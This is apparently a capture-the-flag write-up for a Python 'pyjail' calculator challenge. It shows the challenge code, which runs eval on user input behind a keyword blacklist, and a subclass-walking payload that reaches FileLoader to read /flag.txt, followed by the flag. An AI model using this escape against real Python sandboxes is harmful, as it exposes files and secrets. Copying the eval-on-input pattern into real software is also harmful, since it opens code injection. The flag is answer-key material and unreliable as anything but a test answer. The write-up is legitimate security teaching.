Cont of [[Easy Jail]], another pyjail challenge.

```python
#!/usr/bin/env python3

print("           _            _       _             ")
print("          | |          | |     | |            ")
print("  ___ __ _| | ___ _   _| | __ _| |_ ___  _ __ ")
print(" / __/ _` | |/ __| | | | |/ _` | __/ _ \| '__|")
print("| (_| (_| | | (__| |_| | | (_| | || (_) | |   ")
print(" \___\__,_|_|\___|\__,_|_|\__,_|\__\___/|_|   ")

BLACKLIST = ["open", "input", "eval", "exec", "import", "getattr", "sh", "builtins", "global"]
def calc(op):
	try : 	
		res = eval(op)
	except :
		return print("Wrong operation")
	return print(f"{op} --> {res}")

def main():
	while True :
		inp = input(">> ")
		if any(bad in inp for bad in BLACKLIST) :
			print("Are you tying to hack me !!!!!")
		else : 
			calc(inp)

if __name__ == '__main__':
	main()
```

Most of the challenge logic still follows [[Easy Jail]]. But there are a few differences...

- `BLACKLIST = ["open", "input", "eval", "exec", "import", "getattr", "sh", "builtins", "global"]`
	- Here we are blacklisted from using things like `import` or `open` to read the flag so we need to pivot from here
- `if any(bad in inp for bad in BLACKLIST) :`
	- This is how the blacklist is being enforced

Now I started off with `().__class__.__bases__[0].__subclasses__()` to see what we could use. There were 2 types of things we need to look for.
- Something to execute commands
- Something to read files

Now from that command we found the `<class '_frozen_importlib_external.FileLoader'>`. This is a pretty useful class to read from files. 
 
My final payload:
```python
next(x for x in ().__class__.__bases__[0].__subclasses__() if "FileLoader" in str(x))("/flag.txt", "").get_data("/flag.txt")
```

To import the function, I used `x for x in ().__class__.__bases__[0].__subclasses__()` and then the rest of it I used the `FileLoader` to read <u>flag.txt</u>.

Flag:  `KashiCTF{C4N_S71LL_CL3AR_8L4CKL15T_j1W17CtT}`

